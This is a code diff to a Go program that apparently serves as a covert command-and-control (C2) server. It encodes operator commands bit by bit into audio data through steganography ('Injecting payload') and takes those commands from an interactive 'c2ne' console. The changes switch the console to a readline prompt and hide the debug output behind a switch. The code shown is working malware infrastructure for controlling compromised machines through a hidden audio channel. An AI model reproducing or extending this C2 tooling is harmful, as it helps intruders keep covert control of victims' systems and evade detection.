@@ -12,8 +12,10 @@ import (
 	"crypto/tls"
 	"flag"
 	"strconv"
-	"bufio"
-	"strings"
+	//"bufio"
+	//"strings"
+	"io"
+	"github.com/chzyer/readline"
 
 )
 
@@ -155,7 +157,9 @@ label1 :
 				var cmd_bitstring []string 
 
 				for _, char := range command{
-					fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
+					if echo_to_stdout=="on"{
+						fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
+					}
 					cmd_bitstring = append(cmd_bitstring, fmt.Sprintf("%08b", char))
 				}
 				
@@ -164,13 +168,16 @@ label1 :
 				cmd_charIndex :=0
 				var audio_stegd_bytes []byte
 
-				fmt.Println("Chunk length = ", len(chunk))
-				fmt.Printf("Injecting payload (%d characters)...\n", len(command))
-				//if len(chunk) < len(command)*8{ fmt.Println("Need bigger chunks"); return}
+				if echo_to_stdout=="on"{
+					fmt.Println("Chunk length = ", len(chunk))
+					fmt.Printf("Injecting payload (%d characters)...\n", len(command))
+				}
 
 				for _, aud_byte := range chunk{
 					if cmd_charIndex == len(command) {
-						fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
+						if echo_to_stdout=="on"{
+							fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
+						}
 						break
 					}
 
@@ -249,27 +256,27 @@ func main() {
 
 // StartCLIConsole accepts asynchronous text inputs from operators
 func StartCLIConsole() {
-	scanner := bufio.NewScanner(os.Stdin)
-	fmt.Println("[Console] Operator dynamic C2 link active. Type a command and press Enter:")
-	for {
-		fmt.Print("C2-Command> ")
-		
-		//read until a newline (\n)
-		if scanner.Scan() {
-			input := scanner.Text()
+	fmt.Println("c2ne is active. Type a command and press Enter")
+    rl, err := readline.New("c2ne> ")
+    if err != nil {
+        log.Fatal(err)
+    }
+    defer rl.Close()
 
-			//Clean up whitespaces in the start and end, if any
-			input = strings.TrimSpace(input)
-
-			if input != "" {
-				cliMessageChan <- input
-			}
+    for {
+        line, err := rl.Readline()
+        if err == io.EOF || err == readline.ErrInterrupt {
+            break
+        }
+        if err != nil {
+            log.Println("read error:", err)
+            continue
+        }
+        if line != "" {
+			cliMessageChan <- line
 		}
-
-		// Handle EOF-type errors
-		if err := scanner.Err(); err != nil {
-			fmt.Fprintln(os.Stderr, "reading standard input:", err)
-			return
-		}
-	}
+    }
 }
+
+
+			
